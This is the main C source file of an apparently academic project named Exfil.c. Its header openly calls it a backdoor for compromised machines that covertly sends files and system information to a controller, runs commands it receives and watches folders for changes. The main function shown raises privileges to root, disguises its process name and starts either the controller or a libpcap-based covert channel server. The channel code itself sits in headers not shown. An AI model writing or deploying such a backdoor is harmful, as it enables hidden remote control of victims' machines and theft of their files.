/*
 ============================================================================
 Name        : Exfil.c

 Programmers : Jivanjot S. Brar & Shan Bains

 Version     : 1.0

 Copyright   : GPL

 Description : Exfiltration Program that resides on compromised machines and
 covertly send files, system information to the controlling application. It
 executes commands sent by the Controller and also monitors files and
 directories for modifications or creation and then sends those files over to
 the controller.

 Built using libpcap to create a backdoor and quietly sniffing incomming
 traffic and raw sockets in order to encode and transfer data or commands.

 Compile	 :

 Execute	 :
 ============================================================================
 */

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <stdbool.h>

#include "defs.h"
#include "mask.h"
#include "util.h"
#include "server.h"
#include "client.h"

int main(int argc, char *argv[]) {
	extern char* optarg;
	extern int optind, optopt;
	int c, chan = 1;
	bool client = false;
	char channel[4];
	char lclhost[MAX_LEN];
	char rmthost[MAX_LEN];
	char folder[MAX_LEN];
	uint32 src_addr, dst_addr;

	strncpy(channel, CHAN_TCP, strlen(CHAN_TCP));
	strncpy(lclhost, DEF_SRC, MAX_LEN);
	strncpy(rmthost, DEF_DST, MAX_LEN);
	strncpy(folder, DEF_FOLDER, MAX_LEN);

	while ((c = getopt(argc, argv, OPTIONS)) != -1) {
		switch (c) {
		case 'c': // client?
			client = true;
			break;
		case 'b': // server?
			client = false;
			break;
		case 's': // local host
			strncpy(lclhost, optarg, MAX_LEN);
			break;
		case 'd': // remote host
			strncpy(rmthost, optarg, MAX_LEN);
			break;
		case 'w': // file watch
			strncpy(folder, optarg, MAX_LEN);
			break;
		case 'h': // help
			usage(argv[0]);
			break;
		case 'x': // channel
			if (tolower(optarg[0]) == 't') {
				strncpy(channel, CHAN_TCP, strlen(CHAN_TCP));
				chan = 1;
			} else if (tolower(optarg[0]) == 'u') {
				strncpy(channel, CHAN_UDP, strlen(CHAN_UDP));
				chan = 2;
			}
			break;
		case ':': // Missing operand.
			fprintf(stderr, "-%c requires an operand.\n\n", optopt);
			usage(argv[0]);
			break;
		}
	}

	fprintf(stderr, "%s ==> %s\n", lclhost, rmthost);
	fprintf(stderr, "Channel => %s\n", channel);

	setuid(0);
	setegid(0);
	setgid(0);
	seteuid(0);

	// Mask the application name
	mask_prog(argv[0]);

	src_addr = resolve(lclhost);
	dst_addr = resolve(rmthost);

	if (client) { // Controller Client
		backdoor_client(src_addr, dst_addr, channel);
	} else { // Backdoor Server
		pcap_init(src_addr, dst_addr, folder, chan);
	}

	return EXIT_SUCCESS;
}
